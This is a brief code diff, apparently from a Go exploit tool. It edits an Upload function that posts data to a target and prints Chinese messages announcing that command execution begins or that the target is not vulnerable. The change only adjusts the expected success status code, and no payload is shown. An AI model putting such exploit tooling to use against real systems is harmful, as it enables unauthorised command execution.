@@ -37,17 +37,17 @@ func Upload(url, b64_str string) {
 	client.SetUserAgent(user_agent)
 	resp, err := client.R().SetContentType("application/json").SetBodyString(jsonText).Post(tarGet)
 	if err != nil {
+		_ = err
 		fmt.Println("[-] 上传失败，请检查网络.")
 		os.Exit(0)
 	}
-	_ = err
-	_ = resp
-	if resp.StatusCode == 201 {
+	if resp.StatusCode == 200 {
 		fmt.Println("[+] 上传成功，开始命令执行.")
 	} else {
 		fmt.Println("[-] 上传失败，目标不存在漏洞.")
 		os.Exit(0)
 	}
+
 	// fmt.Println(client)
 
 }
